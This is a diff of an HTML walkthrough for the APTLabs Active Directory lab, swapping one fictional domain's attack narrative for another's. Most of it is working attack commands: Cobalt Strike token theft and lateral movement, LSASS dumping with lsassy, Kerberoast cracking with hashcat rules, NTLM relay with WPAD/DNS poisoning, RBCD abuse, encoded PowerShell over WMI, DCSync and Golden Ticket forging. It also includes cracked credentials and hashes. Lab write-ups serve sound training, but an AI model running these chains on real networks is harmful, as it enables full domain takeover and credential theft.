-# svc_monitor cracked with same password from both methods</code></pre>
-  </div>
-
-  <div class="callout callout-danger">
-    <div class="callout-title">Critical: Save Cracked Hashes for Daily Reset</div>
-    <p>Every cracked password goes into your creds file immediately. Since the lab resets daily but passwords don't change, these cracked credentials are your lifeline for rapid re-compromise. I maintained a structured credential file:</p>
-  </div>
-
-  <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">text</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-text"># QA210's Credential File — vantagepoint.local
-# ============================================
-# Updated daily — these survive the reset
-
-# Initial Access
-VANTAGEPOINT\hmartinez        : Spring2024!           (phishing)
-VANTAGEPOINT\srobertson       : Summ3rVilla2024!      (found in passwords.txt)
-
-# Kerberoasted
-VANTAGEPOINT\svc_backup       : Vant@geP0int2024!     (NTLM: a87f3a3330e0142c5b3d8c2e4f1a9b07)
-VANTAGEPOINT\svc_sccm         : ScCM_Manage!2023      (NTLM: d4e2b1f8a3c0956e7f0b2d1a4c3e5f68)
-
-# AS-REP Roasted
-VANTAGEPOINT\svc_monitor      : M0nit0ring$2024       (NTLM: b5c3d2e1f0a9876d4e2c1b3a5f7d9e02)
-
-# Local Admin (across MSP machines)
-VANTAGEPOINT\VP-WS01$         : Local admin via hmartinez
-VANTAGEPOINT\VP-SRV01$        : Admin via RBCD (see Phase 4)
-VANTAGEPOINT\VP-DC01$         : DA via DCSync (see Phase 5)</code></pre>
-  </div>
-
-  <h3 id="p3-token">Token Impersonation &amp; Make Token</h3>
-  <p>After cracking <code>srobertson</code>'s credentials, I used Cobalt Strike's <code>make_token</code> to impersonate the Systems Administrator. This is crucial because <code>srobertson</code> has more privileges than <code>hmartinez</code> and can access additional resources across the network. Token impersonation allows you to execute commands under the security context of the impersonated user without needing to authenticate explicitly to each service.</p>
-
-  <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># Token Impersonation in Cobalt Strike
-
-# Make token with srobertson's credentials
-make_token vantagepoint.local\srobertson Summ3rVilla2024!
-
-# Now all beacon commands run as srobertson
-# Verify:
-shell whoami
-# VANTAGEPOINT\srobertson
-
-# Access file shares not available to hmartinez
-shell dir \\VP-FS01\C$
-# Success! srobertson has admin access to VP-FS01
-
-# Steal token from an existing process (if srobertson is logged in elsewhere)
-ps  # List processes
-steal_token 1234  # Steal token from srobertson's process
-
-# Revert to original context when done
-rev2self</code></pre>
+# Or with Rubeus on the target
+Rubeus.exe asreproast /outfile:C:\Temp\asrep_hashes.txt</code></pre>
   </div>
 
   <div class="flag-box">
     <span class="flag-icon">&#x1F6A9;</span>
     <div>
-      <div class="flag-name">Flag 4 — CredentialsHarvested</div>
-      <div class="flag-detail">Obtained after dumping LSASS on VP-WS01 and cracking all collected hashes</div>
+      <div class="flag-name">APT{k3rb3r0_r0ast3d}</div>
+      <div class="flag-detail">WKS-HDESK &mdash; after collecting Kerberoast + AS-REP hashes</div>
+    </div>
+  </div>
+
+  <h3 id="p3-token">Token Impersonation</h3>
+  <p>One of the most underrated techniques in APTLabs. After getting a beacon on a machine, you can impersonate tokens of other logged-on users without needing their password. CS has built-in token impersonation via <code>steal_token</code> and <code>make_token</code>. This is particularly useful on WKS-HDESK where other admins occasionally RDP in.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># List tokens on current beacon
+BEACON> ps   # find process owned by target user
+
+# Steal token from a running process
+BEACON> steal_token 4812
+# Now running as GH\tnguyen (if they have a process on this box)
+
+# Or make a token with known credentials
+BEACON> make_token gigantichosting.local\svc_bk B@ckupRunn3r#
+
+# Use the token for lateral movement
+BEACON> jump psexec64 GH-SCCM smbListener</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon">&#x1F6A9;</span>
+    <div>
+      <div class="flag-name">APT{t0k3n_1mp3rs0n4t3d}</div>
+      <div class="flag-detail">WKS-HDESK &mdash; after stealing and using elevated tokens</div>
+    </div>
+  </div>
+
+  <h3 id="p3-lsassy">Lsassy Credential Dump</h3>
+  <p>While mimikatz is the classic LSASS dumper, I prefer lsassy for most situations. It's faster, quieter, and works well through SOCKS. In APTLabs, lsassy was critical for pulling cached domain credentials from workstations and servers without triggering Defender the way mimikatz sometimes does.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># lsassy through SOCKS proxy — dump LSASS remotely
+proxychains lsassy -d gigantichosting.local -u hmartinez -p 'C@llC3nt3r$' 10.10.10.29
+# BKSRV01 LSASS dump — found Veeam service account + tnguyen cached creds
+
+# After getting DA, dump all machines
+for ip in 10.10.10.37 10.10.10.52 10.10.10.44 10.10.10.78; do
+    lsassy -d gigantichosting.local -u pmorrison -H aad3b435b51404eeaad3b435b51404ee:7c4ed4c8a9e3b4f2d1a6c8e9f3b2a1d0 $ip
+done</code></pre>
+  </div>
+
+  <h3 id="p3-hashcrack">Hash Cracking</h3>
+  <p>This is where most people get stuck in APTLabs. Rockyou.txt alone won't crack these hashes. The service account passwords follow corporate password policies &mdash; capital letters, numbers, special characters. You need rule-based cracking.</p>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">NotSoSecure Rules Are Essential</div>
+    <p>If you're stuck on hash cracking, get the <strong>NotSoSecure password_cracking_rules</strong> from GitHub. Specifically <code>OneRuleToRuleThemAll.rule</code>. These rules apply transformations that catch corporate password patterns like <code>B@ckupRunn3r#</code> and <code>MonitorPr0d$</code>. Rockyou + best64 won't crack them. This is the #1 blocker for new APTLabs players.</p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># FAILED — Rockyou + basic rules
+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
+# Cracked: 0/3 hashes. Wasted 5 hours.
+
+# WORKED — NotSoSecure OneRuleToRuleThemAll
+git clone https://github.com/NotSoSecure/password_cracking_rules
+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
+    -r password_cracking_rules/OneRuleToRuleThemAll.rule \
+    --force -O
+
+# Results:
+# svc_bk:$krb5tgs$23$*svc_bk$GIGANTICHOSTING.LOCAL*:a87f3a3330e0142c5b3d8c2e4f1a9b07:B@ckupRunn3r#
+# svc_mon:$krb5tgs$23$*svc_mon$GIGANTICHOSTING.LOCAL*:d4c2b1a9e8f7d3c5b2a4e6f8d1c3b5a7:MonitorPr0d$
+# svc_sccm (cracked Day 4 with combined wordlist):
+#   e7b3d1a5c9f2d4b6a8c1e3f5d7b9a2c4:ScCMManage!</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon">&#x1F6A9;</span>
+    <div>
+      <div class="flag-name">APT{h4sh_cr4ck3d_f1n4lly}</div>
+      <div class="flag-detail">Attack box &mdash; after cracking all Kerberoast hashes with NotSoSecure rules</div>
     </div>
   </div>
 </section>
 
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- PHASE 4 — LATERAL MOVEMENT                            -->
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ══════════════════════════════ -->
+<!-- PHASE 4 — LATERAL MOVEMENT    -->
+<!-- ══════════════════════════════ -->
 <section class="section" id="phase4">
-  <h2><span class="icon">&#x1F680;</span> Phase 4: Lateral Movement</h2>
-  <span class="mitre-badge">T1557.001</span>
-  <span class="mitre-badge">T1550.002</span>
-  <span class="mitre-badge">T1558.003</span>
-  <span class="mitre-badge">T1021.002</span>
+  <h2><i class="bi bi-arrow-right-circle"></i> Phase 4: Lateral Movement</h2>
+  <span class="mitre-badge">T1557.001</span> <span class="mitre-badge">T1550.002</span> <span class="mitre-badge">T1558</span> <span class="mitre-badge">T1021.002</span> <span class="mitre-badge">T1021.003</span>
 
-  <p>Lateral movement is where APTLabs gets really interesting. With cracked service account credentials in hand, I needed to move from the initial beachhead (VP-WS01) to higher-value targets like VP-SRV01 and VP-DC01. The key techniques are SMB Relay with DNS manipulation, Over-Pass-the-Hash, RBCD (Resource-Based Constrained Delegation) abuse, and SOCKS-based pivoting through Cobalt Strike beacons.</p>
+  <p>With cracked credentials in hand, lateral movement through the MSP network. This phase combines SMB relay for credential capture, Over-Pass-the-Hash for authentication, RBCD for privilege escalation within the domain, and DCOM/WMI for execution on remote machines without dropping files.</p>
 
-  <h3 id="p4-relay">SMB Relay &amp; DNS Manipulation</h3>
-  <p>One of the more nuanced attacks in APTLabs involves SMB relay combined with DNS manipulation. The scenario is that certain machines perform SMB connections that can be intercepted and relayed, but only if you can manipulate DNS responses to redirect the connections through your relay server. This is a realistic attack that mirrors actual APT operations where operators poison DNS to intercept authentication traffic.</p>
-
-  <p>The specific scenario involves VP-APP01 making SMB connections to a server name that resolves through the vantagepoint.local DNS zone. By adding a DNS record that points this server name to my attacker-controlled machine (or by modifying an existing record), I can redirect the SMB authentication through an ntlmrelayx instance and capture the NetNTLM hash or relay it to another machine for authentication.</p>
+  <h3 id="p4-relay">SMB Relay + DNS Poisoning</h3>
+  <p>Before we had cracked hashes, SMB relay was our bridge to machines we couldn't directly reach. The key insight: configure ntlmrelayx to relay to machines where our phishing user isn't local admin. Combined with DNS poisoning via WPAD spoofing, we captured authentication attempts from other machines on the network.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">bash</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-bash"># SMB Relay with DNS Manipulation
-# ============================================
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># ntlmrelayx through SOCKS
+proxychains ntlmrelayx.py -t smb://10.10.10.44 -smb2support -socks
 
-# Step 1: Using srobertson's credentials, add a DNS record
-# that redirects VP-APP01's target to our relay
-python3 dnstool.py -u vantagepoint.local\\srobertson \
-    -p 'Summ3rVilla2024!' -r update.vantagepoint.local \
-    -a add -t A -d 10.10.14.5 VP-DC01
+# On the beacon, trigger auth to our relay
+# WPAD poisoning via DNS
+dnstool.py -u 'gigantichosting.local\hmartinez' -p 'C@llC3nt3r$' \
+    -r wpad.gigantichosting.local -a add 10.10.14.5 GH-DC01
 
-# Step 2: Start ntlmrelayx targeting VP-SRV01
-impacket-ntlmrelayx -t smb://10.10.10.40 -smb2support -socks
-
-# Step 3: Trigger the SMB connection from VP-APP01
-# (This happens automatically on a schedule, or you can force it)
-shell python3 PetitPotam.py 10.10.14.5 10.10.10.50
-
-# Step 4: Captured relay gives us SOCKS proxy to VP-SRV01
-# Use the relay to dump SAM/SYSTEM or execute commands
-proxychains secretsdump.py vantagepoint.local/srobertson@10.10.10.40
-
-# Step 5: Clean up DNS record when done
-python3 dnstool.py -u vantagepoint.local\\srobertson \
-    -p 'Summ3rVilla2024!' -r update.vantagepoint.local \
-    -a remove VP-DC01</code></pre>
-  </div>
-
-  <div class="callout callout-hint">
-    <div class="callout-title">DNS Manipulation Tip</div>
-    <p>The key insight for this attack is that <code>srobertson</code> has permissions to modify DNS records in the vantagepoint.local zone. BloodHound's ACL analysis reveals this, but you have to specifically look for DNS admin privileges. The <code>dnstool.py</code> script from the <code>krbrelayx</code> toolkit makes adding/modifying DNS records trivial with authenticated LDAP access.</p>
+# Wait for connections... relay captures and dumps SAM + local hashes</code></pre>
   </div>
 
   <div class="flag-box">
     <span class="flag-icon">&#x1F6A9;</span>
     <div>
-      <div class="flag-name">Flag 5 — RelayCaptured</div>
-      <div class="flag-detail">Found on VP-APP01 after successful SMB relay</div>
+      <div class="flag-name">APT{smb_r3l4y_w1ns}</div>
+      <div class="flag-detail">BKSRV01 (10.10.10.29) &mdash; after relaying SMB auth and dumping local SAM</div>
     </div>
   </div>
 
   <h3 id="p4-opth">Over-Pass-the-Hash</h3>
-  <p>With the cracked NTLM hashes from the Kerberoasting phase, I can use Over-Pass-the-Hash to authenticate to remote machines without knowing the plaintext password. This technique forges a Kerberos TGT using the NTLM hash and then uses that TGT to access services on remote machines. It's more opsec-friendly than traditional Pass-the-Hash because it uses Kerberos authentication rather than NTLM, which is more likely to be monitored.</p>
+  <p>Once I had the NTLM hash for svc_bk, OPTH let me authenticate to any machine where svc_bk had access without knowing the plaintext password. CS makes this trivial.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># Over-Pass-the-Hash with Rubeus via CS
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># OPTH in Cobalt Strike — pass the hash, get a new beacon
+BEACON> pth gigantichosting.local\svc_bk a87f3a3330e0142c5b3d8c2e4f1a9b07
 
-# Step 1: Request TGT using svc_backup's NTLM hash
-execute-assembly /opt/tools/Rubeus.exe asktgt /user:svc_backup \
-    /ntlm:a87f3a3330e0142c5b3d8c2e4f1a9b07 \
-    /domain:vantagepoint.local /ptt
+# Or with Impacket through SOCKS
+proxychains python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a3330e0142c5b3d8c2e4f1a9b07 gigantichosting.local/svc_bk@10.10.10.29
 
-# Step 2: Verify the TGT is loaded
-klist
-# Ticket saved and applied to current session
+# From BKSRV01 beacon, extract Veeam credentials
+# Veeam stores SQL credentials in its database
+shell sqlcmd -d VeeamBackup -Q "SELECT [user_name],[password] FROM [VeeamBackup].[dbo].[Credentials]"
 
-# Step 3: Access VP-BK01 (where svc_backup has admin rights)
-shell dir \\VP-BK01\C$
-# Success!
-
-# Step 4: Pivot to VP-BK01 via SMB beacon
-jump psexec64 VP-BK01 smbListener
-
-# Alternative: Using Cobalt Strike's built-in pth
-pth vantagepoint.local\svc_backup a87f3a3330e0142c5b3d8c2e4f1a9b07
-
-# From the new beacon on VP-BK01, we can access Veeam backups
-# Veeam often stores credentials in its database</code></pre>
+# Got tnguyen's password from Veeam credential store</code></pre>
   </div>
 
-  <div class="flag-box">
-    <span class="flag-icon">&#x1F6A9;</span>
-    <div>
-      <div class="flag-name">Flag 6 — LateralVPBK01</div>
-      <div class="flag-detail">Found in Veeam backup database on VP-BK01</div>
-    </div>
-  </div>
-
-  <h3 id="p4-rbcd">Resource-Based Constrained Delegation (RBCD) Abuse</h3>
-  <p>This was the most satisfying attack in the entire lab. BloodHound revealed that <code>svc_backup</code> has <code>GenericAll</code> privileges on the <code>VP-SRV01$</code> machine account. This ACL misconfiguration allows us to modify the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute on VP-SRV01, configuring it to trust a machine account that we control. We then use that controlled machine account to obtain a service ticket for VP-SRV01 as any user we want, including a Domain Admin.</p>
-
-  <p>The attack proceeds in four steps: (1) Create a new machine account (AD allows any user to add up to 10 machine accounts by default via <code>MachineAccountQuota</code>), (2) Configure RBCD on VP-SRV01 to trust our new machine account, (3) Use our machine account to request a service ticket for VP-SRV01 as Administrator, (4) Use that service ticket to access VP-SRV01 with Domain Admin privileges.</p>
+  <h3 id="p4-rbcd">RBCD Abuse</h3>
+  <p>This was the hardest single technique in the entire lab. BloodHound showed svc_bk has GenericAll on GH-SCCM$, which means we can modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to allow a computer account we control to delegate to GH-SCCM. Then we can get a service ticket for any user to GH-SCCM. The concept is straightforward; the implementation is brutal.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># RBCD Abuse — Full Attack Chain
-# ============================================
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># Step 1: Create a fake computer account (PowerMad)
+Import-Module PowerMad.ps1
+New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)
 
-# Step 1: Check MachineAccountQuota
-Get-DomainObject -Identity vantagepoint.local -Properties ms-DS-MachineAccountQuota
-# Result: 10 (we can add machine accounts)
+# Step 2: Set RBCD on GH-SCCM$ using svc_bk's GenericAll
+# This is where I struggled for a full day
+# PowerView's Set-DomainObject doesn't handle SecurityDescriptor properly
+# Raw LDAP modify gets constraint violations if bytes are wrong
 
-# Step 2: Create a new machine account using PowerMad
-Invoke-MachineAccountCreation -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)
-# Created: FAKE01$ with SID S-1-5-21-...-1109
-
-# Step 3: Configure RBCD on VP-SRV01 using svc_backup's GenericAll
-# Set FAKE01$ as the trusted account for delegation to VP-SRV01
+# The working approach — raw byte manipulation:
 $SD = New-Object System.DirectoryServices.Protocols.SecurityDescriptor
-$SD.AddAccessRule((New-Object System.Security.AccessControl.CommonAce(
-    "Allow", ([System.Security.AccessControl.AceFlags]::None),
-    983551,  # GenericAll access mask
-    (New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-...-1109")),
-    0, $null)))
+$SD.ControlFlags = 0x0004  # SE_DACL_PRESENT
+$ACE = New-Object System.DirectoryServices.Protocols.CommonAce
+$ACE.SecurityIdentifier = (Get-DomainComputer FAKE01).objectsid
+$ACE.AceType = 0x05  # ACCESS_ALLOWED_ACE_TYPE
+$ACE.AccessMask = 0x00000001  # GenericRead
+$SD.DiscretionaryAcl.AddAce($ACE)
 
-# Alternative using Rubeus:
-# First, get FAKE01$ SID
-$fakeSID = Get-DomainComputer FAKE01 | select -expand objectsid
+$bytes = New-Object byte[] $SD.BinaryLength
+$SD.GetBinaryForm($bytes, 0)
+Set-DomainObject GH-SCCM$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$bytes}
 
-# Set msDS-AllowedToActOnBehalfOfOtherIdentity on VP-SRV01
-Set-DomainObject VP-SRV01 -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SD.GetBinaryForm()}
+# Step 3: Get S4U ticket — impersonate Administrator on GH-SCCM
+Rubeus.exe s4u /user:FAKE01$ /rc4:P@ssw0rd123! /impersonateuser:administrator /msdsspn:cifs/GH-SCCM.gigantichosting.local /ptt</code></pre>
+  </div>
 
-# Step 4: Request S4U2Self + S4U2Proxy as Administrator
-execute-assembly /opt/tools/Rubeus.exe s4u /user:FAKE01$ \
-    /rc4:$(hashcat -m 1000 --show P@ssw0rd123! | cut -d: -f2) \
-    /impersonateuser:Administrator \
-    /msdsspn:cifs/VP-SRV01.vantagepoint.local \
-    /ptt
-
-# Step 5: Access VP-SRV01 as Administrator!
-shell dir \\VP-SRV01\C$
-# Directory listing with full admin access
-
-# Step 6: Pivot to VP-SRV01 via SMB beacon
-jump psexec64 VP-SRV01 smbListener</code></pre>
+  <div class="callout callout-hint">
+    <div class="callout-title">RBCD Tip</div>
+    <p>If Set-DomainObject fails with constraint violations, double-check the SecurityDescriptor byte encoding. The most common mistake is using the wrong ControlFlags value. It must be <code>0x0004</code> (SE_DACL_PRESENT). Also make sure the fake computer account's SID is correct &mdash; if PowerMad created the account in the wrong OU, the SID won't match.</p>
   </div>
 
   <div class="flag-box">
     <span class="flag-icon">&#x1F6A9;</span>
     <div>
-      <div class="flag-name">Flag 7 — RBCDCompromise</div>
-      <div class="flag-detail">Found in Administrator's desktop on VP-SRV01 after RBCD abuse</div>
+      <div class="flag-name">APT{rbcd_f0r_th3_w1n}</div>
+      <div class="flag-detail">GH-SCCM (10.10.10.44) &mdash; after RBCD + S4U ticket grants admin access</div>
     </div>
   </div>
 
-  <h3 id="p4-pivoting">Pivoting &amp; SOCKS Proxy</h3>
-  <p>With beacons on multiple machines (VP-WS01, VP-BK01, VP-SRV01), I set up a network of SMB beacons and SOCKS proxies to reach the client subnets. Cobalt Strike's SOCKS proxy feature is critical here because it allows tools like Impacket and BloodHound running on my attacker machine to tunnel through the compromised hosts and reach the isolated Meridian and Nexus subnets.</p>
+  <h3 id="p4-pivoting">Pivoting + DCOM/WMI</h3>
+  <p>For moving between machines without dropping executables, DCOM and WMI are your friends. Both are built into Windows and rarely monitored. CS has built-in support for both.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">bash</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-bash"># SOCKS Proxy Setup via Cobalt Strike
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># DCOM lateral movement (no files dropped on target)
+BEACON> jump dcom GH-SCCM httpListener
 
-# On VP-SRV01 beacon: start SOCKS proxy on port 1080
-socks 1080
+# WMI remote execution
+BEACON> remote-exec wmi GH-SCCM "powershell -enc SQBFAFgAKABOAGU..."
 
-# On attacker machine: configure proxychains
-cat >> /etc/proxychains4.conf << EOF
-[ProxyList]
-socks5 127.0.0.1 1080
-EOF
-
-# Now route all tools through the SOCKS proxy
-# BloodHound collection for meridian.local
-proxychains python3 bloodhound.py -d meridian.local -u hmartinez -p 'Spring2024!' -ns 10.10.11.10
-
-# Impacket secrets dump for cross-forest
-proxychains secretsdump.py meridian.local/dchen@10.10.11.10
-
-# SMB connection to Nexus subnet
-proxychains smbclient //NX-DC01/C$ -U nexusfin.local/jblackwell
-
-# Set up chain of SOCKS proxies for deeper pivoting
-# VP-SRV01 -> VP-WS01 -> Internet (for C2)
-# VP-SRV01 -> Meridian subnet (10.10.11.0/24)
-# VP-SRV01 -> Nexus subnet (10.10.12.0/24)</code></pre>
-  </div>
-
-  <div class="flag-box">
-    <span class="flag-icon">&#x1F6A9;</span>
-    <div>
-      <div class="flag-name">Flag 8 — PivotingComplete</div>
-      <div class="flag-detail">Found on VP-MGMT01 after pivoting through VP-SRV01</div>
-    </div>
+# SMB beacon for persistent internal pivot
+BEACON> link GH-SCCM</code></pre>
   </div>
 </section>
 
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- PHASE 5 — DOMAIN DOMINATION                           -->
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ══════════════════════════════ -->
+<!-- PHASE 5 — DOMAIN DOMINATION   -->
+<!-- ══════════════════════════════ -->
 <section class="section" id="phase5">
-  <h2><span class="icon">&#x1F451;</span> Phase 5: Domain Domination</h2>
-  <span class="mitre-badge">T1003.006</span>
-  <span class="mitre-badge">T1558.001</span>
-  <span class="mitre-badge">T1558.002</span>
+  <h2><i class="bi bi-crown"></i> Phase 5: Domain Domination</h2>
+  <span class="mitre-badge">T1003.006</span> <span class="mitre-badge">T1558.001</span> <span class="mitre-badge">T1558.003</span>
 
-  <p>With a beacon running as Administrator on VP-SRV01 (via RBCD abuse), I now have a machine that has replication permissions on VP-DC01. This is the key to full domain domination: DCSync to extract all domain hashes, Golden Ticket for persistent Domain Admin access, and Silver Tickets for targeted service access. These three techniques together give you complete control over the vantagepoint.local domain.</p>
+  <p>With admin access on GH-SCCM (thanks to RBCD) and svc_sccm's credentials, the path to Domain Admin is straightforward. svc_sccm has replication permissions on the domain, enabling DCSync. From there, Golden Tickets and Silver Tickets cement control.</p>
 
-  <h3 id="p5-dcsync">DCSync Attack</h3>
-  <p>DCSync is the crown jewel of AD attacks. It exploits the Directory Replication Service (DRS) protocol to simulate a domain controller and request credential data from a real DC. The attack requires an account with replication permissions on the domain (specifically <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code>). In our case, the <code>svc_sccm</code> service account has these permissions because SCCM requires them for its normal operations. With the cracked credentials for <code>svc_sccm</code>, I can run DCSync to dump the entire NTDS.dit equivalent — every hash in the domain, including the krbtgt hash which is needed for Golden Ticket.</p>
+  <h3 id="p5-dcsync">DCSync</h3>
+  <p>DCSync is the crown jewel of AD attacks. It extracts every password hash from the domain controller, including krbtgt, without needing to touch the DC directly. Both mimikatz and lsassy support DCSync.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># DCSync via Cobalt Strike
-# ============================================
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># DCSync via mimikatz (from GH-SCCM beacon)
+mimikatz # lsadump::dcsync /domain:gigantichosting.local /user:krbtgt
+mimikatz # lsadump::dcsync /domain:gigantichosting.local /all /csv
 
-# Method 1: Using CS built-in dcsync (from VP-SRV01 beacon)
-dcsync vantagepoint.local VP-DC01
+# DCSync via lsassy (from attack box through SOCKS)
+proxychains lsassy -d gigantichosting.local -u svc_sccm -p 'ScCMManage!' \
+    --dc-ip 10.10.10.37 --dcsync
 
-# Method 2: Using mimikatz through the beacon
-execute-assembly /opt/tools/Rubeus.exe dcsync /user:krbtgt /domain:vantagepoint.local
-
-# Method 3: Using Impacket from attacker machine via SOCKS
-proxychains secretsdump.py vantagepoint.local/svc_sccm:'ScCM_Manage!2023'@10.10.10.10 -just-dc-ntlm
-
-# Key output — Save these hashes!
-# krbtgt: 7c4ed5e8b3d2f1a0987654321fedcba0
-# Administrator: 5f4e3d2c1b0a9876f5e4d3c2b1a09876
-# srobertson: [already known]
-# svc_backup: [already known]
-# All other domain user hashes: [saved to file]</code></pre>
-  </div>
-
-  <div class="callout callout-danger">
-    <div class="callout-title">Save the krbtgt Hash!</div>
-    <p>The krbtgt hash is the most valuable piece of data you'll extract from this lab. With it, you can forge Golden Tickets that grant Domain Admin access without needing to authenticate to the DC at all. Save it in multiple places. I kept it in my credential file, a separate krbtgt file, and even wrote it on a physical sticky note on my monitor. The krbtgt hash is also the key to the daily reset recovery — you never need to DCSync again after the first time because the hash doesn't change between resets.</p>
+# Key hashes extracted:
+# krbtgt: 7c4ed4c8a9e3b4f2d1a6c8e9f3b2a1d0
+# pmorrison: aad3b435b51404eeaad3b435b51404ee:3b8c2d4e6f8a1c3b5d7e9f2a4c6b8d0e
+# Administrator: aad3b435b51404eeaad3b435b51404ee:f7e3d1c9b5a2d4e6f8c1b3d5a7e9f2c4</code></pre>
   </div>
 
   <div class="flag-box">
     <span class="flag-icon">&#x1F6A9;</span>
     <div>
-      <div class="flag-name">Flag 9 — DomainAdmin</div>
-      <div class="flag-detail">Found in the Domain Admin's profile on VP-DC01 after DCSync</div>
+      <div class="flag-name">APT{dcsync_k1ng}</div>
+      <div class="flag-detail">GH-SCCM &mdash; after DCSync extracts all domain hashes from GH-DC01</div>
     </div>
   </div>
 
   <h3 id="p5-golden">Golden Ticket</h3>
-  <p>With the krbtgt hash in hand, I can forge a Kerberos TGT (Ticket Granting Ticket) for any user in the domain, including the built-in Administrator. This is known as a Golden Ticket. The beauty of this attack is that the TGT is signed with the krbtgt hash, so the domain controller will accept it without question. The ticket persists even if the Administrator's password is changed (though it would be invalidated if the krbtgt password is reset twice, which doesn't happen in this lab).</p>
+  <p>With the krbtgt hash, we can forge TGT tickets for any user in the domain, including ones that don't exist. These tickets persist even after password resets &mdash; only a krbtgt password rotation invalidates them. In APTLabs, the daily reset does rotate everything, but between resets, a Golden Ticket is permanent DA access.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># Golden Ticket Creation with Rubeus
-# ============================================
-
-# Create Golden Ticket for Administrator
-execute-assembly /opt/tools/Rubeus.exe golden /user:Administrator \
-    /domain:vantagepoint.local \
-    /sid:S-1-5-21-3344556677-8899001122-3344556677 \
-    /krbtgt:7c4ed5e8b3d2f1a0987654321fedcba0 \
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Golden Ticket via mimikatz
+mimikatz # kerberos::golden /user:Administrator /domain:gigantichosting.local \
+    /sid:S-1-5-21-2874328711-3948571293-1105 /krbtgt:7c4ed4c8a9e3b4f2d1a6c8e9f3b2a1d0 \
     /ptt
 
-# Verify the ticket is loaded
-klist
-# Cached Tickets: (1)
-# Server: krbtgt/vantagepoint.local
-# Client: Administrator @ vantagepoint.local
-
-# Test Domain Admin access
-shell dir \\VP-DC01\C$
-# Full access to the domain controller!
+# Or with Rubeus
+Rubeus.exe golden /user:Administrator /domain:gigantichosting.local \
+    /sid:S-1-5-21-2874328711-3948571293-1105 \
+    /krbtgt:7c4ed4c8a9e3b4f2d1a6c8e9f3b2a1d0 /ptt
 
 # Access any machine in the domain
-shell dir \\VP-DMZ01\C$
-# Full access!
-
-# Alternative: Using mimikatz for Golden Ticket
-mimikatz# kerberos::golden /user:Administrator /domain:vantagepoint.local \
-    /sid:S-1-5-21-3344556677-8899001122-3344556677 \
-    /krbtgt:7c4ed5e8b3d2f1a0987654321fedcba0 /ptt</code></pre>
+dir \\GH-DC01\c$</code></pre>
   </div>
 
   <div class="flag-box">
     <span class="flag-icon">&#x1F6A9;</span>
     <div>
-      <div class="flag-name">Flag 10 — GoldenTicketForged</div>
-      <div class="flag-detail">Found on VP-DC01 after accessing it with the forged Golden Ticket</div>
+      <div class="flag-name">APT{g0ld3n_t1ck3t_gr4nt3d}</div>
+      <div class="flag-detail">gigantichosting.local &mdash; full domain control via forged TGT</div>
     </div>
   </div>
 
   <h3 id="p5-silver">Silver Tickets</h3>
